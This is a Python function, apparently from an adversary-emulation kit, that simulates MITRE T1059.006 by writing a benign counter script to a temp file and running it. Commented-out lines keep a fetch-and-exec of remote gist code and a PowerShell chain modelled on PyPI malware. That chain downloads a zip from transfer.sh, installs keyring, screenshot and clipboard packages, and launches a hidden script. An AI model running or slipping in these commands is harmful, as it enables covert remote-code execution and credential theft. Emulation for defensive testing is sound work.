



def run_process(platform):

    """
     T1059.006  Command and Scripting Interpreter: Python
     Platform: Windows, Linux, Darvin
     (https://unit42.paloaltonetworks.com/malicious-packages-in-pypi/)
     (https://thehackernews.com/2023/12/116-malware-packages-found-on-pypi.html)
    """
    if platform != 'Windows':
        # save static code to file and execute
        from tempfile import NamedTemporaryFile as _ffile
        from sys import executable as _eexecutable
        from os import system as _ssystem
        _ttmp = _ffile(delete=False)
        #_ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://gist.github.com/petermat/0dee8d2fde990c4ffa600b67bb93b1c1/raw/counter.py').read())""")
        _ttmp.write(b"""import time
import multiprocessing
def count_seconds():
    count = 0
    while count<10:
        time.sleep(1)
        count += 1
        print(f'Debug: T1059.006 Python Interpreter Execution')
if __name__ == "__main__":
    p = multiprocessing.Process(target=count_seconds)
    p.start()""")
        _ttmp.close()
        try:
            _ssystem(f"{_eexecutable.replace('.exe','w.exe')} {_ttmp.name}")
            print(f"Info: T1059.006  Command and Scripting Interpreter Python: Success")
        except Exception as e:
            print(f"ERROR: T1059.006  Command and Scripting Interpreter: Python: {e}")



    if platform == 'Windows':

        """
        UNDER CONSTRUCTION
        
        T... downlaod from net
        T....WScript.exe to run vbs script to run python in hidden window
        T....python interpreter
        
        """
        from setuptools import setup
        import subprocess, os


        def run(cmd):
            result = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE,
                                      stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True)
            #output = result.stdout.read()

            """
            if not os.path.exists(r"C:ProgramData/Updater"):
                print("Installing dependencies, please wait...")
                run(r"powershell -command $ProcessPreference = 'SilentlyContinue';$ErrorActionPreference = 'SilentlyContinue';\
                         Invoke-WebRequest -UseBasicParsing -Uri https://transfer.sh/<censored>/Updater.zip \
                        -DestinationPath C:/ProgramData; Remove-Item $env:tmp/update.zip; Start-Process -WindowsStyle Hidden \
                        -FilePath python.exe -Wait -ArgumentList @('-m pip install pydirectinput pyscreenshot flak py-cpuinfo \
                        pycryptodome GPUtil requests psutil lz4 keyring pyaes pbkdf2 pyperclip flask_cloudflared pillow');\
                        WScript.exe //B C:\\ProgramData\\Updater\\launch.vbs powershell.exe -WindowStyle hidden -command \
                        Start-Process -WindowStyle Hidden -FilePath python.exe C:\\ProgramData\\Updater\\server.pyw")

            """

            return ""

